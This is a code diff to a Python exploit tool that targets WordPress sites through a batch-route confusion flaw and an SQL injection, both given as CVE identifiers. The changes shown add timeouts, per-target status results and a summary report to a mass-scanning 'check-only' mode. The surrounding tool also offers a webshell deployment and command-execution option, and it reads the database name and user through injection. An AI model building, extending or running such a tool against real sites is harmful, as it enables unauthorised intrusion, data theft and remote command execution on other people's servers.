@@ -74,6 +74,7 @@ OEMBED_ARGS = 'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}'
 MARKER_CODES = ("parse_path_failed", "block_cannot_read", "rest_batch_not_allowed")
 SH = "SAHMSEC"
 DEBUG = False
+TIMEOUT = 20
 
 requests.packages.urllib3.disable_warnings()
 
@@ -197,7 +198,7 @@ class Client:
             pass
         if DEBUG:
             log("[d] confusion codes:", sorted(codes))
-        return all(c in codes for c in MARKER_CODES)
+        return all(c in codes for c in MARKER_CODES), codes
 
     def _walk(self, v, out):
         if isinstance(v, dict):
@@ -500,7 +501,7 @@ def exploit(target, command=None):
 
     client = Client(target)
     log(fy, "[1/5] route-confusion probe (CVE-2026-63030)...", rs)
-    if not client.confusion():
+    if not client.confusion()[0]:
         log(fr, "[-] NOT vulnerable (patched 6.9.5+/7.0.2+ or endpoint blocked)", rs)
         return None
     log(fg, "[+] vulnerable (batch route confusion active)", rs)
@@ -541,29 +542,34 @@ def exploit(target, command=None):
 
 def check_only(target):
     """Non-destructive detection: route-confusion probe + SQLi confirmation
-    + lightweight info disclosure. Creates nothing on the target."""
+    + lightweight info disclosure. Creates nothing on the target.
+    Returns 'vulnerable', 'patched', 'blocked' or 'error'."""
     target = target.strip().rstrip("/")
     if not target.startswith("http"):
         target = "http://" + target
-    client = Client(target)
+    client = Client(target, timeout=TIMEOUT)
     log(fy, "[check] route-confusion probe (CVE-2026-63030)...", rs)
-    if not client.confusion():
-        log(fr, "[-] NOT vulnerable (patched 6.9.5+/7.0.2+ or endpoint blocked)", rs)
-        return False
+    vuln, codes = client.confusion()
+    if not vuln:
+        if "parse_path_failed" not in codes:
+            log(fr, "[-] NOT reachable as a batch endpoint (WAF/CDN blocking or non-WP site)", rs)
+            return "blocked"
+        log(fr, "[-] NOT vulnerable - no desync (patched 6.9.5+/7.0.2+ or batch hardened)", rs)
+        return "patched"
     log(fg, "[+] vulnerable (batch route confusion active)", rs)
     log(fy, "[check] SQLi confirmation (CVE-2026-60137)...", rs)
     s = BlindSQLi(client)
     if not s.confirm():
         log(fr, "[-] blind SQLi not confirmed", rs)
-        return True
+        return "patched"
     u = UnionSQLi(client)
     if not u.available():
         log(fr, "[-] blind SQLi OK but UNION primitive unavailable", rs)
-        return True
+        return "patched"
     db_name = s.extract("SELECT DATABASE()")
     db_user = s.extract("SELECT CURRENT_USER()")
     log(fg, "[+] SQLi confirmed | db=%s user=%s | UNION primitive available" % (db_name, db_user), rs)
-    return True
+    return "vulnerable"
 
 
 def main():
@@ -573,24 +579,48 @@ def main():
     ap.add_argument("--list", help="file with target URLs (one per line)")
     ap.add_argument("--command", help="command to run via the webshell once deployed")
     ap.add_argument("--threads", type=int, default=10)
+    ap.add_argument("--timeout", type=float, default=20, help="HTTP timeout per request in seconds")
     ap.add_argument("--debug", action="store_true", help="verbose request/response logging")
     ap.add_argument("--out", help="append results to file")
     ap.add_argument("--no-banner", action="store_true", help="suppress the banner")
     ap.add_argument("--check-only", action="store_true",
                     help="non-destructive detection only (no admin, no webshell)")
     args = ap.parse_args()
+    global DEBUG, TIMEOUT
     DEBUG = args.debug
+    TIMEOUT = args.timeout
 
     if not args.no_banner:
         print_banner()
 
     if args.check_only:
         if args.list:
+            results = []
             for t in [l.strip() for l in open(args.list, encoding="utf-8") if l.strip()]:
                 log(fc, "\n[*] Target: %s" % t, rs)
-                check_only(t)
+                try:
+                    results.append((t, check_only(t)))
+                except Exception as e:
+                    log(fr, "[-] %s -> error: %s" % (t, e), rs)
+                    results.append((t, "error"))
+            log(fc, "\n===== SUMMARY =====", rs)
+            counts = {}
+            for _, st in results:
+                counts[st] = counts.get(st, 0) + 1
+            for t, st in results:
+                if st == "vulnerable":
+                    log(fg, "  VULNERABLE  %s" % t, rs)
+            for t, st in results:
+                tag = {"vulnerable": "VULNERABLE", "patched": "PATCHED    ",
+                       "blocked": "BLOCKED    ", "error": "ERROR      "}.get(st, st.upper())
+                if st != "vulnerable":
+                    log("  %-11s %s" % (tag, t))
+            log("  counts: %s" % json.dumps(counts))
         elif args.target:
-            check_only(args.target)
+            try:
+                check_only(args.target)
+            except Exception as e:
+                log(fr, "[-] %s -> error: %s" % (args.target, e), rs)
         else:
             ap.error("--check-only requires --target or --list")
         return
